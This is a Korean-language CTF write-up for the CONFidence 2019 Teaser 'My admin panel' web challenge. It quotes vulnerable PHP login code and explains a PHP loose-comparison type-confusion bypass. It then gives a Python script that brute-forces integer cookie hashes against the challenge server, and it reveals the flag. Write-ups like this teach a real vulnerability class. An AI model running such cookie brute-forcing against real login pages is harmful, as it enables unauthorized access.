---
layout: post
title: My admin panel
category: Web
source: "CONFidence CTF 2019 Teaser"
rpath: /resource/My_admin_panel
tag: [php, type_confusion]
---

**Category**: Web

**Source**: CONFidence CTF 2019 Teaser

**Points**: ???

**Author**: Jisoon Park(js00n.park)

**Description:** 

> I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?
> 
> https://gameserver.zajebistyc.tf/admin/

## Write-up

![img]({{page.rpath|prepend:site.baseurl}}/prob.png)

주어진 사이트로 들어가 보면 login.php와 login.php.bak를 볼 수 있다. .bak 파일은 login.php의 소스 코드를 보여주기 위해 만들어 둔 것 같다. 코드를 살펴보자.

```php
[...]

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```

otadmin이라는 쿠키를 만들어 줘야 하는데, 숫자와 A-Z로 구성된 hash 값을 JSON 형태로 보내야 한다. 우리가 보낸 값이 $cfg_pass 변수의 md5 hash와 동일하면 admin 관련 내용을 보여주도록 되어 있다.

php에서 문자열과 입력값을 비교할 때는 type confusion을 생각해 봐야 한다. 일단, 알파벳으로 시작하는 문자열은 0과 비교했을 때 true이니, hash 값으로 정수 0을 보내보자.

![img]({{page.rpath|prepend:site.baseurl}}/hint.png)

if 문의 조건을 통과하지 못하는 것을 보니 MD5 hash의 결과가 알파벳으로 시작하지는 않는 것 같다. 힌트로 주는 문자열은 0과 64의 조합이다. 이 문자열은 $cfg_pass 변수의 MD5 해쉬 결과(문자열)의 각 자리에 대한 ascii code에 0xC0를 and 연산 한 결과이다. 0xC0는 이진수로 쓰면 11000000b로, and 연산했을 때 64 미만의 수에 대해서는 0이 나온다. MD5 hash 결과는 숫자 또는 A부터 F 까지의 문자로 구성되어 있을 테니, 이 결과가 0이면 해당 자리가 숫자이고 64이면 문자라는 뜻이다.

결국, MD5($cfg_pass)는 숫자|숫자|숫자|문자|문자|문자|숫자|문자|.... 의 형식으로 구성되어 있다는 뜻이다.

이 힌트에서 얻어야 하는 부분은 맨 앞에 연속된 숫자로 구성된 자릿수가 3자리 라는 것이다. php는 문자열과 숫자를 비교할 때, 문자열이 숫자로 시작하면 그 부분만 숫자로 인식하여 비교한다. (예를 들면, **"123AAA" == 123** 를 true로 판단한다.)

세 자리 숫자에 대한 경우의 수는 1000가지이니, 간단하게 brute-force 해볼 수 있을 것 같다.

아래와 같은 [코드]({{site.github.master}}{{page.rpath}}/ex.py)를 작성하여 쉽게 찾을 수 있었고, 그 결과 flag를 받았다.

```python
import requests

url = "https://gameserver.zajebistyc.tf/admin/login.php"

for i in range(1000):
  cookies = {"otadmin": '{"hash": %03d}'%i}
  print cookies
  response = requests.get(url, cookies=cookies)
  print response.status_code
  print response.text
```

![img]({{page.rpath|prepend:site.baseurl}}/flag.png)

Flag : **p4{wtf_php_comparisons_how_do_they_work}**
